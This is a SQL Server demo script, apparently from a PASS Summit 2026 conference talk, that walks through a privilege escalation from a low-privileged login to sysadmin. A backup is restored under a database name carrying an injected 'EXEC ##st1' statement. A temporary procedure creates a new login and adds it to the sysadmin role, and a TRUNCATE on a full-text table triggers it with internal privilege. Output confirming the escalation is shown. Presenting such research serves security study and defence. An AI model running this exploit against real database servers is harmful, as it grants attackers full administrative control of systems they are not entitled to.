/*
  PASS Summit 2026
  Author: Fabiano Amorim | fabianonevesamorim@hotmail.com
*/

EXEC AS LOGIN = 'AppDemo3'
GO

-- What can I do at server level?
SELECT * FROM sys.fn_my_permissions(NULL, 'SERVER')
GO

-- I can't add myself to sysadmin
ALTER SERVER ROLE [sysadmin] ADD MEMBER AppDemo3;
GO
/*
Msg 15151, Level 16, State 1, Line 105
Cannot alter the server role 'sysadmin', because it does not exist or you do not have permission.
*/


/* Restore DbAppDemo3.bak on instance you want to hack */
-- Restore DbAppDemo3 with a special name :-) 
-- DROP DATABASE "tempdb].dbo.##tmp1; EXEC ##st1;--"
IF DB_ID('DbAppDemo3') IS NOT NULL DROP DATABASE DbAppDemo3;
GO
RESTORE DATABASE "tempdb].dbo.##tmp1; EXEC ##st1;--" FROM DISK = N'C:\Temp\Backup\DbAppDemo3.bak' 
WITH FILE = 1,
MOVE N'DbAppDemo3' TO N'D:\DBs\DbAppDemo3_test1.mdf',
MOVE N'DbAppDemo3_log' TO N'D:\DBs\DbAppDemo3_test1_log.ldf',
NOUNLOAD, REPLACE
GO

/* Create table ##tmp1 and procedure we want to execute */
DROP PROC IF EXISTS ##st1;
GO
CREATE PROC ##st1
AS
BEGIN
  IF SUSER_ID('*** Demo 3 - I Should Not Be Here I''m a SysAdmin now ***') IS NULL
  BEGIN
    SELECT 'Hello, it''s me :-)';
    CREATE LOGIN [*** Demo 3 - I Should Not Be Here I'm a SysAdmin now ***] WITH PASSWORD=N'complexpwd', CHECK_POLICY=OFF;
    ALTER SERVER ROLE [sysadmin] ADD MEMBER [*** Demo 3 - I Should Not Be Here I'm a SysAdmin now ***];
  END
END
GO
-- This is the table used in the db name
DROP TABLE IF EXISTS ##tmp1;
CREATE TABLE ##tmp1 (ID INT)
GO


/* Run the truncate on FT table to trigger the code with the internal privilege */
USE "tempdb].dbo.##tmp1; EXEC ##st1;--"
GO
TRUNCATE TABLE dbo.FTDocuments;
GO

/*
  Verify escalation: use the UI to show the [*** Demo 3 - I Should Not Be Here I''m a SysAdmin now ***]
*/
SELECT
  SUSER_ID('*** Demo 3 - I Should Not Be Here I''m a SysAdmin now ***') AS loginid,
  IS_SRVROLEMEMBER('sysadmin', '*** Demo 3 - I Should Not Be Here I''m a SysAdmin now ***') AS is_sysadmin;
GO
/*
loginid     is_sysadmin
----------- ----------
381         1
*/

USE master
GO
-- Rename the db back to original name
ALTER DATABASE "tempdb].dbo.##tmp1; EXEC ##st1;--" MODIFY NAME = DbAppDemo3 
GO

REVERT
GO